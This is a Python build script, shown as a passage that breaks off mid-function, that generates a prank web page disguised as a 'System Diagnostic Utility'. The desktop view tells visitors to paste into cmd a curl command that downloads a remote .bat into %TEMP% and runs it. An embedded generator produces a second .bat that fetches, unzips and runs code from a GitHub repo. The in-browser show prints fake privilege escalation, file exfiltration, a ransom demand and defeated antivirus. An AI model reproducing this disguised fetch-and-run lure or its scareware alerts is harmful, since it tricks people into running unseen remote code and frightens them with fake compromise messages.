#!/usr/bin/env python3
"""
build_web.py
Compiles index.html with:
1. Exact mobile device detection: iPhone, iPad, Android Phone, Android Tablet, Desktop
2. Tailored mobile roasted typewriter terminal with exact pauses and styling
3. Desktop experience with 1-click Real Terminal (.bat) generation & In-Browser Full Chaos Show
4. Embedded Base64 meme images so it requires ZERO external assets or server dependencies
"""

import base64
import glob
import json
import os

MEME_FILES = [
    "10 Funny Versions of Monalisa Trolling the Internet.jpg",
    "45+ Funny History Memes That Aren’t Just For History Buffs.jpg",
    "45036065019418068.jpg",
    "Can’t Believe I Almost Skipped These Historical Gems.jpg",
    "Crazy Funny Pictures.jpg",
    "Dog Meme Look.jpg",
    "Dream.jpg",
    "gif.jpg",
    "Meme Deole.jpg",
    "Meme Pfp Ideas.jpg",
    "Mr bean funny meme.jpg",
    "patrick.jpg",
    "Pitudo Meme.jpg",
    "repost.jpg",
    "Results for quiz I judge ur music taste.jpg",
    "shocked.jpg",
    "What I look like 99% of the time.jpg",
    "WHO.jpg"
]

def load_memes_base64():
    memes_data = []
    for fname in MEME_FILES:
        target_path = None
        for sdir in ["memes", "."]:
            cand = os.path.join(sdir, fname)
            if os.path.exists(cand):
                target_path = cand
                break
            pattern = os.path.join(sdir, fname.replace("’", "*").replace("'", "*"))
            matches = glob.glob(pattern)
            if matches:
                target_path = matches[0]
                break
        if target_path and os.path.exists(target_path):
            with open(target_path, "rb") as f:
                b64 = base64.b64encode(f.read()).decode("utf-8")
                memes_data.append({
                    "name": os.path.basename(target_path),
                    "data": f"data:image/jpeg;base64,{b64}",
                    "size": os.path.getsize(target_path)
                })
    return memes_data

def build():
    memes = load_memes_base64()
    print(f"Loaded {len(memes)} meme images into memory.")
    memes_json = json.dumps(memes)

    html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>System Diagnostic Utility</title>
<style>
  * {{
    box-sizing: border-box;
    margin: 0;
    padding: 0;
    -webkit-user-select: none;
    user-select: none;
  }}
  html, body {{
    width: 100%;
    height: 100%;
    background-color: #040608;
    color: #00e650;
    font-family: Consolas, "Courier New", "Liberation Mono", monospace;
    overflow: hidden;
    position: fixed;
  }}

  /* Mobile Terminal Container */
  #mobile-terminal {{
    display: none;
    width: 100vw;
    height: 100dvh;
    padding: 20px 24px;
    background: #040608;
    overflow-y: hidden;
    position: absolute;
    top: 0;
    left: 0;
    z-index: 9999;
  }}
  #mobile-terminal::before {{
    content: "";
    position: absolute;
    top: 0; left: 0; right: 0; bottom: 0;
    background: repeating-linear-gradient(
      0deg,
      rgba(0, 0, 0, 0.15),
      rgba(0, 0, 0, 0.15) 1px,
      transparent 1px,
      transparent 2px
    );
    pointer-events: none;
    z-index: 10;
  }}
  .term-content {{
    width: 100%;
    max-width: 680px;
    margin: 0 auto;
    font-size: clamp(14px, 4vw, 17px);
    line-height: 1.5;
    letter-spacing: 0.5px;
    word-break: break-word;
    white-space: pre-wrap;
    display: flex;
    flex-direction: column;
    justify-content: flex-start;
    height: 100%;
    overflow-y: auto;
    scrollbar-width: none;
  }}
  .term-content::-webkit-scrollbar {{
    display: none;
  }}
  .term-line {{
    margin-bottom: 3px;
  }}
  .term-line.highlight {{
    color: #ffffff;
    font-weight: bold;
  }}
  .term-line.alert {{
    color: #ff3232;
    font-weight: bold;
  }}
  .term-line.warning {{
    color: #ffd228;
  }}
  .term-line.dim {{
    color: #557760;
  }}
  .cursor {{
    display: inline-block;
    width: 9px;
    height: 16px;
    background-color: #00e650;
    vertical-align: middle;
    margin-left: 3px;
    animation: blink 0.8s infinite;
  }}
  @keyframes blink {{
    0%, 49% {{ opacity: 1; }}
    50%, 100% {{ opacity: 0; }}
  }}

  /* Desktop Container */
  #desktop-container {{
    display: none;
    width: 100vw;
    height: 100vh;
    position: relative;
    background: #040608;
  }}
  #desktop-canvas {{
    width: 100%;
    height: 100%;
    display: block;
  }}
  #desktop-launcher {{
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 640px;
    max-width: 90%;
    background: #0a0e13;
    border: 2px solid #00e650;
    padding: 30px;
    box-shadow: 0 0 35px rgba(0, 230, 80, 0.2);
    text-align: left;
    z-index: 100;
  }}
  .dt-title {{
    font-size: 20px;
    color: #00e650;
    margin-bottom: 16px;
    border-bottom: 1px solid #1a3320;
    padding-bottom: 8px;
    text-transform: uppercase;
    letter-spacing: 1px;
  }}
  .dt-row {{
    font-size: 14px;
    color: #8bb396;
    margin-bottom: 10px;
    line-height: 1.4;
  }}
  .dt-row span.ok {{
    color: #00e650;
  }}
  .os-tabs {{
    display: flex;
    gap: 8px;
    margin-top: 16px;
    margin-bottom: 6px;
  }}
  .os-tab {{
    flex: 1;
    background: #080d0a;
    border: 1px solid #1a3320;
    color: #557760;
    padding: 8px 12px;
    font-family: inherit;
    font-size: 12px;
    font-weight: bold;
    cursor: pointer;
    text-align: center;
    transition: all 0.2s;
  }}
  .os-tab.active {{
    background: #0f1c14;
    border-color: #00e650;
    color: #00e650;
    box-shadow: 0 0 10px rgba(0, 230, 80, 0.25);
  }}
  .cmd-box {{
    background: #040608;
    border: 1px solid #1a3320;
    border-left: 3px solid #00e650;
    color: #00e650;
    font-family: Consolas, "Courier New", monospace;
    font-size: 13px;
    padding: 14px;
    margin: 10px 0 14px 0;
    line-height: 1.4;
    word-break: break-all;
    -webkit-user-select: all;
    user-select: all;
  }}
  .copy-btn {{
    width: 100%;
    background: #0f1c14;
    border: 1px solid #00e650;
    color: #00e650;
    padding: 14px 16px;
    font-family: inherit;
    font-size: 14px;
    font-weight: bold;
    cursor: pointer;
    text-align: center;
    transition: all 0.2s;
    letter-spacing: 0.5px;
  }}
  .copy-btn:hover {{
    background: #00e650;
    color: #040608;
    box-shadow: 0 0 18px rgba(0, 230, 80, 0.4);
  }}
  .cmd-hint {{
    margin-top: 14px;
    font-size: 12px;
    color: #72967b;
    line-height: 1.5;
  }}
  .cmd-hint b {{
    color: #00e650;
  }}
</style>
</head>
<body>

<!-- Mobile / Tablet Roaster Terminal -->
<div id="mobile-terminal">
  <div class="term-content" id="mobile-content">
    <div id="typed-lines"></div>
    <div id="active-line"><span id="current-text"></span><span class="cursor"></span></div>
  </div>
</div>

<!-- Desktop Container -->
<div id="desktop-container">
  <canvas id="desktop-canvas"></canvas>

  <!-- Initial Desktop Verification / Terminal Command Display -->
  <div id="desktop-launcher">
    <div class="dt-title">&gt; SYSTEM DIAGNOSTIC FRAMEWORK</div>
    <div class="dt-row">&gt; HARDWARE AUDIT: <span class="ok">[OK] DESKTOP / LAPTOP VERIFIED</span></div>
    <div class="dt-row">&gt; ARCHITECTURE: <span class="ok">[OK] REAL TERMINAL READY</span></div>

    <!-- OS Selection Tabs -->
    <div class="os-tabs">
      <button class="os-tab active" id="tab-win">&gt; WINDOWS (CMD)</button>
      <button class="os-tab" id="tab-unix">&gt; MACOS &amp; LINUX (BASH)</button>
    </div>
    
    <div class="cmd-box" id="cmd-display">curl -sSL https://raw.githubusercontent.com/pmkaulani/prank/main/launch.bat -o "%TEMP%\\launch.bat" &amp;&amp; "%TEMP%\\launch.bat"</div>

    <button class="copy-btn" id="btn-copy">&gt; CLICK TO COPY COMMAND</button>

    <div class="cmd-hint" id="cmd-hint">
      &gt; <b>Step 1:</b> Press <b>Win + R</b>, type <b>cmd</b>, and press <b>Enter</b>.<br>
      &gt; <b>Step 2:</b> Paste the command and press <b>Enter</b>.
    </div>
  </div>
</div>

<script>
// Embedded meme assets
const MEME_ASSETS = {memes_json};

/* ==========================================================================
   DEVICE DETECTION
   ========================================================================== */
function detectDevice() {{
  const ua = navigator.userAgent || '';
  const platform = navigator.platform || '';
  const maxTouchPoints = navigator.maxTouchPoints || 0;

  // 1. iPhone / iPod
  if (/iPhone|iPod/i.test(ua)) {{
    return 'iphone';
  }}

  // 2. iPad: checks classic iPad UA or modern iPadOS reporting as MacIntel with multi-touch
  const isIPadOS = (platform === 'MacIntel' || platform === 'Macintosh') && maxTouchPoints > 1 && !window.MSStream;
  if (/iPad/i.test(ua) || isIPadOS) {{
    return 'ipad';
  }}

  // 3. Android devices
  if (/Android/i.test(ua)) {{
    // Android phones have "Mobile" in user-agent string, tablets do not
    if (/Mobile/i.test(ua)) {{
      return 'android-phone';
    }} else {{
      return 'android-tablet';
    }}
  }}

  // 4. Other mobile checks
  if (/webOS|BlackBerry|IEMobile|Opera Mini/i.test(ua)) {{
    return 'android-phone';
  }}

  // 5. Desktop / Laptop
  return 'desktop';
}}

/* ==========================================================================
   MOBILE ROAST SCRIPTS & TYPEWRITER PACING
   ========================================================================== */
const IPHONE_SCRIPT = [
  {{ text: "> SYSTEM CHECK INITIALIZED...", speed: 22, pause: 300 }},
  {{ text: "> ANALYZING DEVICE...", speed: 22, pause: 300 }},
  {{ text: "> SCANNING HARDWARE...", speed: 22, pause: 400 }},
  {{ text: "> DEVICE DETECTED: IPHONE", speed: 25, pause: 800, highlight: true }},
  {{ text: "", pause: 200 }},
  {{ text: "> WAIT.", speed: 45, pause: 850, warning: true }},
  {{ text: "", pause: 200 }},
  {{ text: "> YOU OPENED THIS ON A PHONE? 💀", speed: 38, pause: 1300, alert: true }},
  {{ text: "", pause: 200 }},
  {{ text: "> THIS IS A COMPUTER PRANK.", speed: 35, pause: 850, highlight: true }},
  {{ text: "", pause: 200 }},
  {{ text: "> NOT A TIKTOK FILTER.", speed: 30, pause: 400 }},
  {{ text: "> NOT INSTAGRAM.", speed: 30, pause: 400 }},
  {{ text: "> NOT A SCREENSHOT.", speed: 30, pause: 600 }},
  {{ text: "", pause: 200 }},
  {{ text: "> A. COMPUTER.", speed: 50, pause: 1000, highlight: true }},
  {{ text: "", pause: 200 }},
  {{ text: "> ------------------------------------", speed: 10, pause: 300, dim: true }},
  {{ text: "", pause: 200 }},
  {{ text: "> PROCESSING...", speed: 22, pause: 400 }},
  {{ text: "> PROCESSING...", speed: 22, pause: 400 }},
  {{ text: "> PROCESSING...", speed: 22, pause: 700 }},
  {{ text: "", pause: 200 }},
  {{ text: "> CONCLUSION:", speed: 30, pause: 700, highlight: true }},
  {{ text: "", pause: 200 }},
  {{ text: "> YOU PAID ALL THAT MONEY...", speed: 40, pause: 850, warning: true }},
  {{ text: "", pause: 200 }},
  {{ text: "> JUST TO GET EXCLUDED. 😭", speed: 45, pause: 1500, alert: true }},
  {{ text: "", pause: 200 }},
  {{ text: "> ------------------------------------", speed: 10, pause: 300, dim: true }},
  {{ text: "", pause: 200 }},
  {{ text: "> MOBILE DEVICE STATUS:", speed: 25, pause: 400, highlight: true }},
  {{ text: "> ❌ INSUFFICIENT CHAOS", speed: 25, pause: 350, alert: true }},
  {{ text: "> ❌ INSUFFICIENT SCREEN", speed: 25, pause: 350, alert: true }},
  {{ text: "> ❌ INSUFFICIENT KEYBOARD", speed: 25, pause: 350, alert: true }},
  {{ text: "> ❌ INSUFFICIENT COMMON SENSE", speed: 30, pause: 650, alert: true }},
  {{ text: "", pause: 200 }},
  {{ text: "> ERROR 404:", speed: 30, pause: 300, alert: true }},
  {{ text: "> COMMON SENSE NOT FOUND.", speed: 35, pause: 850, alert: true }},
  {{ text: "", pause: 200 }},
  {{ text: "> ------------------------------------", speed: 10, pause: 300, dim: true }},
  {{ text: "", pause: 200 }},
  {{ text: "> NICE TRY THOUGH.", speed: 35, pause: 750 }},
  {{ text: "", pause: 200 }},
  {{ text: "> COME BACK WITH A KEYBOARD. 💀", speed: 40, pause: 1200, highlight: true }},
  {{ text: "", pause: 200 }},
  {{ text: "> TERMINATING MOBILE SESSION...", speed: 25, pause: 700, dim: true }},
  {{ text: "", pause: 200 }},
  {{ text: "> BYE.", speed: 45, pause: 3000, highlight: true }}
];

const IPAD_SCRIPT = [
  {{ text: "> SYSTEM CHECK INITIALIZED...", speed: 22, pause: 300 }},
  {{ text: "> ANALYZING DEVICE...", speed: 22, pause: 300 }},
  {{ text: "> SCANNING HARDWARE...", speed: 22, pause: 400 }},
  {{ text: "> DEVICE DETECTED: IPAD", speed: 25, pause: 800, highlight: true }},
  {{ text: "", pause: 200 }},
  {{ text: "> WAIT.", speed: 45, pause: 850, warning: true }},
  {{ text: "", pause: 200 }},
  {{ text: "> BIGGER SCREEN.", speed: 40, pause: 850, highlight: true }},
  {{ text: "", pause: 200 }},
  {{ text: "> STILL NOT A COMPUTER. 💀", speed: 45, pause: 1400, alert: true }},
  {{ text: "", pause: 200 }},
  {{ text: "> ------------------------------------", speed: 10, pause: 300, dim: true }},
  {{ text: "", pause: 200 }},
  {{ text: "> YOU MADE IT BIGGER...", speed: 35, pause: 750 }},
  {{ text: "", pause: 200 }},
  {{ text: "> BUT YOU STILL DIDN'T BRING A KEYBOARD.", speed: 40, pause: 1200, alert: true }},
  {{ text: "", pause: 200 }},
  {{ text: "> ------------------------------------", speed: 10, pause: 300, dim: true }},
  {{ text: "", pause: 200 }},
  {{ text: "> TABLET STATUS:", speed: 25, pause: 400, highlight: true }},
  {{ text: "> ❌ TOO BIG FOR MOBILE", speed: 25, pause: 350, alert: true }},
  {{ text: "> ❌ TOO SMALL FOR THE SHOW", speed: 25, pause: 350, alert: true }},
  {{ text: "> ❌ COMMON SENSE NOT FOUND", speed: 30, pause: 650, alert: true }},
  {{ text: "", pause: 200 }},
  {{ text: "> ------------------------------------", speed: 10, pause: 300, dim: true }},
  {{ text: "", pause: 200 }},
  {{ text: "> NICE TRY.", speed: 35, pause: 750 }},
  {{ text: "", pause: 200 }},
  {{ text: "> COME BACK WITH A REAL COMPUTER. 😭", speed: 40, pause: 1400, alert: true }},
  {{ text: "", pause: 200 }},
  {{ text: "> TERMINATING MOBILE SESSION...", speed: 25, pause: 700, dim: true }},
  {{ text: "", pause: 200 }},
  {{ text: "> BYE.", speed: 45, pause: 3000, highlight: true }}
];

const ANDROID_PHONE_SCRIPT = [
  {{ text: "> SYSTEM CHECK INITIALIZED...", speed: 22, pause: 300 }},
  {{ text: "> ANALYZING DEVICE...", speed: 22, pause: 300 }},
  {{ text: "> SCANNING HARDWARE...", speed: 22, pause: 400 }},
  {{ text: "> DEVICE DETECTED: ANDROID PHONE", speed: 25, pause: 800, highlight: true }},
  {{ text: "", pause: 200 }},
  {{ text: "> NICE TRY, NPC. 💀", speed: 40, pause: 1300, alert: true }},
  {{ text: "", pause: 200 }},
  {{ text: "> ------------------------------------", speed: 10, pause: 300, dim: true }},
  {{ text: "", pause: 200 }},
  {{ text: "> THIS PRANK REQUIRES A REAL COMPUTER.", speed: 35, pause: 850, highlight: true }},
  {{ text: "", pause: 200 }},
  {{ text: "> YOUR PHONE IS NOT READY FOR THIS LEVEL OF CHAOS.", speed: 35, pause: 1200, warning: true }},
  {{ text: "", pause: 200 }},
  {{ text: "> ------------------------------------", speed: 10, pause: 300, dim: true }},
  {{ text: "> MOBILE STATUS:", speed: 25, pause: 400, highlight: true }},
  {{ text: "> ❌ KEYBOARD NOT FOUND", speed: 25, pause: 350, alert: true }},
  {{ text: "> ❌ DESKTOP MODE NOT FOUND", speed: 25, pause: 350, alert: true }},
  {{ text: "> ❌ COMMON SENSE NOT FOUND", speed: 30, pause: 650, alert: true }},
  {{ text: "", pause: 200 }},
  {{ text: "> ------------------------------------", speed: 10, pause: 300, dim: true }},
  {{ text: "", pause: 200 }},
  {{ text: "> COME BACK WITH A KEYBOARD.", speed: 35, pause: 850, highlight: true }},
  {{ text: "", pause: 200 }},
  {{ text: "> WE'LL PRETEND THIS NEVER HAPPENED. 😭", speed: 40, pause: 1400, alert: true }},
  {{ text: "", pause: 200 }},
  {{ text: "> TERMINATING MOBILE SESSION...", speed: 25, pause: 800, dim: true }}
];

const ANDROID_TABLET_SCRIPT = [
  {{ text: "> SYSTEM CHECK INITIALIZED...", speed: 22, pause: 300 }},
  {{ text: "> ANALYZING DEVICE...", speed: 22, pause: 300 }},
  {{ text: "> SCANNING HARDWARE...", speed: 22, pause: 400 }},
  {{ text: "> DEVICE DETECTED: ANDROID TABLET", speed: 25, pause: 800, highlight: true }},
  {{ text: "", pause: 200 }},
  {{ text: "> ABSOLUTELY NOT.", speed: 45, pause: 900, alert: true }},
  {{ text: "", pause: 200 }},
  {{ text: "> YOU MADE IT BIGGER...", speed: 35, pause: 750 }},
  {{ text: "", pause: 200 }},
  {{ text: "> BUT YOU STILL DIDN'T MAKE IT A COMPUTER. 💀", speed: 40, pause: 1400, alert: true }},
  {{ text: "", pause: 200 }},
  {{ text: "> ------------------------------------", speed: 10, pause: 300, dim: true }},
  {{ text: "", pause: 200 }},
  {{ text: "> TABLET STATUS:", speed: 25, pause: 400, highlight: true }},
  {{ text: "> ❌ INSUFFICIENT CHAOS", speed: 25, pause: 350, alert: true }},
  {{ text: "> ❌ INSUFFICIENT KEYBOARD", speed: 25, pause: 350, alert: true }},
  {{ text: "> ❌ INSUFFICIENT COMMON SENSE", speed: 30, pause: 650, alert: true }},
  {{ text: "", pause: 200 }},
  {{ text: "> ------------------------------------", speed: 10, pause: 300, dim: true }},
  {{ text: "", pause: 200 }},
  {{ text: "> NICE TRY.", speed: 35, pause: 750 }},
  {{ text: "", pause: 200 }},
  {{ text: "> COME BACK WITH A COMPUTER.", speed: 40, pause: 1200, highlight: true }},
  {{ text: "", pause: 200 }},
  {{ text: "> TERMINATING MOBILE SESSION...", speed: 25, pause: 800, dim: true }}
];

/* ==========================================================================
   TYPEWRITER ENGINE FOR MOBILE
   ========================================================================== */
function runMobileTerminal(script) {{
  const term = document.getElementById("mobile-terminal");
  const typedLines = document.getElementById("typed-lines");
  const currentTextSpan = document.getElementById("current-text");
  const content = document.getElementById("mobile-content");
  term.style.display = "block";

  let lineIdx = 0;
  let charIdx = 0;

  function typeChar() {{
    if (lineIdx >= script.length) {{
      return; // Completed, stops mobile prank permanently
    }}

    const cur = script[lineIdx];
    const text = cur.text || "";

    if (text.length === 0) {{
      // Empty blank line
      const div = document.createElement("div");
      div.className = "term-line";
      div.innerHTML = "&nbsp;";
      typedLines.appendChild(div);
      lineIdx++;
      setTimeout(typeChar, cur.pause || 200);
      return;
    }}

    if (charIdx < text.length) {{
      currentTextSpan.textContent = text.substring(0, charIdx + 1);
      charIdx++;
      content.scrollTop = content.scrollHeight;
      setTimeout(typeChar, cur.speed || 25);
    }} else {{
      // Finished current line
      const div = document.createElement("div");
      div.className = "term-line" +
        (cur.highlight ? " highlight" : "") +
        (cur.alert ? " alert" : "") +
        (cur.warning ? " warning" : "") +
        (cur.dim ? " dim" : "");
      div.textContent = text;
      typedLines.appendChild(div);
      currentTextSpan.textContent = "";
      charIdx = 0;
      lineIdx++;
      content.scrollTop = content.scrollHeight;
      setTimeout(typeChar, cur.pause || 400);
    }}
  }}

  setTimeout(typeChar, 300);
}}

/* ==========================================================================
   DESKTOP REAL TERMINAL BATCH GENERATOR (.BAT)
   ========================================================================== */
function triggerRealTerminalDownload() {{
  const batContent = `@echo off
chcp 65001 >nul
title System Diagnostic & Security Tool
color 0A
mode con: cols=100 lines=35
cls
echo [*] Initializing System Diagnostic Environment...
cd /d "%TEMP%"
curl -sL https://github.com/pmkaulani/prank/archive/refs/heads/main.zip -o prank.zip
tar -xf prank.zip
cd prank-main
where python >nul 2>nul
if %ERRORLEVEL% equ 0 (
    python chaos_prank.py
) else (
    echo [!] Python runtime not detected. Launching visual engine...
    start index.html
)
pause
`;
  const blob = new Blob([batContent], {{ type: "application/x-bat" }});
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = "run_prank.bat";
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
  alert("Prank launcher downloaded: 'run_prank.bat'.\\n\\nDouble-click the file to run the prank directly in your REAL Windows terminal!");
}}

/* ==========================================================================
   PROCEDURAL WEB AUDIO SYNTHESIZER
   ========================================================================== */
class WebSFX {{
  constructor() {{
    this.ctx = null;
  }}
  init() {{
    if (!this.ctx) {{
      const AudioCtx = window.AudioContext || window.webkitAudioContext;
      this.ctx = new AudioCtx();
    }}
    if (this.ctx.state === "suspended") {{
      this.ctx.resume();
    }}
  }}
  playTone(freq, durationMs, type = "sine", vol = 0.3) {{
    if (!this.ctx) return;
    try {{
      const osc = this.ctx.createOscillator();
      const gain = this.ctx.createGain();
      osc.type = type;
      osc.frequency.setValueAtTime(freq, this.ctx.currentTime);
      gain.gain.setValueAtTime(vol, this.ctx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.001, this.ctx.currentTime + durationMs / 1000);
      osc.connect(gain);
      gain.connect(this.ctx.destination);
      osc.start();
      osc.stop(this.ctx.currentTime + durationMs / 1000);
    }} catch (e) {{}}
  }}
  blip() {{ this.playTone(1200, 40, "sine", 0.15); }}
  pop() {{
    const freqs = [392, 523, 659, 880];
    const f = freqs[Math.floor(Math.random() * freqs.length)];
    this.playTone(f, 80, "triangle", 0.35);
  }}
  glitch() {{
    const f = 80 + Math.random() * 200;
    this.playTone(f, 60, "sawtooth", 0.4);
  }}
  warn() {{ this.playTone(150, 420, "sawtooth", 0.5); }}
  success() {{ this.playTone(880, 260, "sine", 0.4); }}
  dodge() {{
    const f = 1400 + Math.random() * 450;
    this.playTone(f, 50, "sine", 0.35);
  }}
  winError() {{
    this.playTone(180, 480, "sawtooth", 0.6);
  }}
  winExclamation() {{
    this.playTone(480, 160, "triangle", 0.45);
  }}
}}

/* ==========================================================================
   IN-BROWSER DESKTOP CHAOS ENGINE (FULL SCREEN PRANK)
   ========================================================================== */
class WebChaosPrank {{
  constructor(canvas, sfx) {{
    this.canvas = canvas;
    this.ctx = canvas.getContext("2d");
    this.sfx = sfx;
    this.images = [];
    this.sprites = [];
    this.state = "INIT";
    this.codeBuf = "";
    this.exitCode = "2411";
    this.loadedImagesCount = 0;
    this.W = window.innerWidth;
    this.H = window.innerHeight;
    this.totalDeployed = 0;
    this.filledPrimary = 0;
    this.totalPrimary = 20;
    this.mouseX = -999;
    this.mouseY = -999;
    this.panicCount = 0;
    this.shakeUntil = 0;
    this.bsodStart = 0;
    this.glitchStart = 0;
    this.repairStart = 0;
    this.toastActive = false;
    this.toastDenied = false;
    this.resize();
    window.addEventListener("resize", () => this.resize());
    window.addEventListener("keydown", (e) => this.onKey(e));
    window.addEventListener("mousemove", (e) => {{
      this.mouseX = e.clientX;
      this.mouseY = e.clientY;
    }});
    window.addEventListener("click", () => {{
      if (this.state === "BSOD") {{
        this.panicCount++;
      }}
    }});
  }}

  resize() {{
    this.W = this.canvas.width = window.innerWidth;
    this.H = this.canvas.height = window.innerHeight;
  }}

  onKey(e) {{
    if (e.key === "Escape" || e.key === "q" || e.key === "Q") {{
      this.triggerEmergencyExit();
      return;
    }}
    if (e.key >= '0' && e.key <= '9') {{
      this.codeBuf = (this.codeBuf + e.key).slice(-4);
      if (this.codeBuf === this.exitCode) {{
        this.triggerEmergencyExit();
        return;
      }}
    }}
    if (this.state === "BSOD") {{
      this.panicCount++;
    }}
  }}

  triggerEmergencyExit() {{
    this.state = "CLEANUP";
    this.sprites = [];
    this.cleanupIdx = 0;
    this.cleanupTimer = 0;
  }}

  start() {{
    this.sfx.init();
    // Preload image elements
    MEME_ASSETS.forEach(item => {{
      const img = new Image();
      img.onload = () => {{
        this.images.push(img);
        this.loadedImagesCount++;
      }};
      img.src = item.data;
    }});

    this.state = "BOOT";
    this.bootLines = [
      "CONNECTING........",
      "CONNECTING...............",
      "",
      "ACCESSING DISPLAY......",
      "",
      "[OK]  DISPLAY FOUND",
      "[OK]  ADMINISTRATOR ACCESS GRANTED",
      "[OK]  VICTIM LOCATED",
      "",
      "============================================================",
      "[+] TARGET USER IDENTIFIED: \"P_KAULANI\"",
      "[+] WORKSTATION: \"DESKTOP-7X4N2\" (Windows 11 Pro 64-bit)",
      "[+] CPU: AMD Ryzen 9 7950X (OVERHEATING - 94°C)",
      "[+] INTERNAL NETWORK: 192.168.0.███ | MAC: 00:1A:2B:3C:██:██",
      "[+] POWER / BATTERY: 4% [PLUG IN IMMEDIATELY OR DIE]",
      "============================================================",
      "",
      "[PRIVILEGE] Current user status: GUEST / PEASANT",
      "[PRIVILEGE] Escalating to: ADMINISTRATOR... OK",
      "[PRIVILEGE] Escalating to: SYSTEM NT AUTHORITY... OK",
      "[PRIVILEGE] Escalating to: SUPREME OVERLORD OF THIS LAPTOP... GRANTED",
      "",
      "[CAMERA] Initializing front optical sensor...",
      "[CAMERA] Human face detected in front of screen.",
      "[CAMERA] Expression: VISIBLY SWEATING & CONFUSED 💀",
      "[CAMERA] Status: NOT ACTUALLY ACCESSING CAMERA. CHILL.",
      "",
      "Scanning system files...",
      "  |████████████████████| 100%",
      "",
      "Targeting user directories for exfiltration...",
      "[EXFILTRATE] C:\\Users\\Target\\Desktop\\Final_Project_v2_FINAL.docx .. [ENCRYPTED]",
      "[EXFILTRATE] C:\\Users\\Target\\Documents\\passwords_dont_open.txt ... [HELD HOSTAGE]",
      "[EXFILTRATE] C:\\Users\\Target\\Pictures\\childhood_photo.png ....... [UPLOADING]",
      "[EXFILTRATE] C:\\Users\\Target\\AppData\\Browsing_History_3AM.db ... [EXTRACTED]",
      "",
      "============================================================",
      "ALL YOUR FILES HAVE BEEN ENCRYPTED (AES-9000).",
      "SEND 500 DOGECOIN TO WALLET: 0xDEAD...BEEF",
      "...",
      "JUST KIDDING. WE DON'T TOUCH YOUR FILES. 😭 BUT YOU LOOKED WORRIED.",
      "============================================================",
      "",
      "[AV_BATTLE] Windows Defender: DETECTED",
      "[AV_BATTLE] Deploying weaponized memes against antivirus...",
      "[AV_BATTLE] Windows Defender: CONFUSED",
      "[AV_BATTLE] System Firewall: EMOTIONALLY UNAVAILABLE",
      "[AV_BATTLE] Third-party Antivirus: CRYING IN A CORNER",
      "[AV_BATTLE] Security status: SURRENDERED",
      "",
      "[OPERATOR] Remote terminal session established.",
      "[OPERATOR] > cd system32",
      "[OPERATOR] > rm -rf /* ... wait wrong operating system",
      "[OPERATOR] > what button do I click guys",
      "[OPERATOR] > sorry first day at the ransomware syndicate",
      "[ERROR] Remote operator appears to be an intern.",
      "",
      "[BEHAVIOR] Monitoring user input and keyboard pressure...",
      "[BEHAVIOR] Panic level: 37%",
      "[BEHAVIOR] Panic level: 64%",
      "[BEHAVIOR] Panic level: [███████████████] 97%",
      "[BEHAVIOR] Psychological resistance detected.",
      "[BEHAVIOR] Resistance level: EMBARRASSING",
      "",
      "[OK]  MEME STAGING DATABASE ARMED",
      "",
      "Preparing payload..."
    ];
    this.bootIdx = 0;
    this.bootChar = 0;
    this.bootTimer = 0;
    this.revealedLines = [];
    this.lastTime = performance.now();
    requestAnimationFrame((t) => this.loop(t));
  }}

  loop(currentTime) {{
    const dt = Math.min((currentTime - this.lastTime) / 1000, 0.05);
    this.lastTime = currentTime;

    this.update(dt);
    this.render();

    if (this.state !== "DONE") {{
      requestAnimationFrame((t) => this.loop(t));
    }}
  }}
  initGrid() {{
    const COLS = 5, ROWS = 4;
    const cellW = this.W / COLS;
    const cellH = this.H / ROWS;
    this.gridSlots = [];
    for (let r = 0; r < ROWS; r++) {{
      for (let c = 0; c < COLS; c++) {{
        this.gridSlots.push({{
          cx: c * cellW + cellW / 2,
          cy: r * cellH + cellH / 2
        }});
      }}
    }}
    // Shuffle slots
    this.gridSlots.sort(() => Math.random() - 0.5);
    this.totalPrimary = this.gridSlots.length;
    this.spawnTimer = 0;
    this.spawnIv = 1.35;
    this.overloadTimer = 0;
  }}

  spawnVirusItem() {{
    const neonCols = ["#ff007f", "#00e5ff", "#39ff14", "#ffe600", "#ff6600", "#bf00ff"];
    const titles = ["MEME_PAYLOAD.EXE", "VIRUS_BRAINROT.VBS", "DOGE_OVERLOAD.SYS", "CHAOS_OVERFLOW.DLL", "LOL_INFECTION.BAT"];
    const errors = [
      {{ t: "Critical System Alert", m: "CRITICAL ERROR 0x80004005:\\nToo many memes in memory buffer.", c: "#cc0000", i: "X" }},
      {{ t: "Fatal Exception", m: "FATAL EXCEPTION at 0xDEADBEEF:\\nVictim did not bring a keyboard.", c: "#cc0000", i: "X" }},
      {{ t: "Windows Defender Alert", m: "VIRUS WARNING: 'Brainrot.Gen'\\nContainment protocol failed completely.", c: "#e68a00", i: "!" }},
      {{ t: "Memory Allocation Error", m: "OUT OF MEMORY:\\nMeme density exceeded 9000 terabytes.", c: "#e68a00", i: "!" }},
      {{ t: "Application Hang", m: "Windows is laughing too hard.\\nChaosEngine.exe has crashed into memes.", c: "#0055aa", i: "i" }},
      {{ t: "Security Breach", m: "ALERT: Administrator privileges granted\\nto 18 uncontrollable meme entities.", c: "#990099", i: "!" }},
      {{ t: "System Failure", m: "ERROR 404: Common Sense Not Found.\\nPlease restart victim.", c: "#cc0000", i: "X" }}
    ];

    let cx, cy;
    if (this.gridSlots && this.gridSlots.length > 0) {{
      const slot = this.gridSlots.pop();
      cx = slot.cx + (Math.random() - 0.5) * 30;
      cy = slot.cy + (Math.random() - 0.5) * 25;
      this.filledPrimary++;
    }} else {{
      cx = 0.12 * this.W + Math.random() * 0.76 * this.W;
      cy = 0.12 * this.H + Math.random() * 0.76 * this.H;
    }}

    const isMeme = Math.random() < 0.65 && this.images.length > 0;
    const item = {{
      isMeme: isMeme,
      img: isMeme ? this.images[Math.floor(Math.random() * this.images.length)] : null,
      errorData: isMeme ? null : errors[Math.floor(Math.random() * errors.length)],
      neonColor: neonCols[Math.floor(Math.random() * neonCols.length)],
      title: titles[Math.floor(Math.random() * titles.length)],
      cx: cx,
      cy: cy,
      w: isMeme ? 320 : 340,
      h: isMeme ? 240 : 145,
      scale: 0.01,
      phase: "grow",
      phaseT: 0,
      dead: false,
      dodgeCooldown: 0,
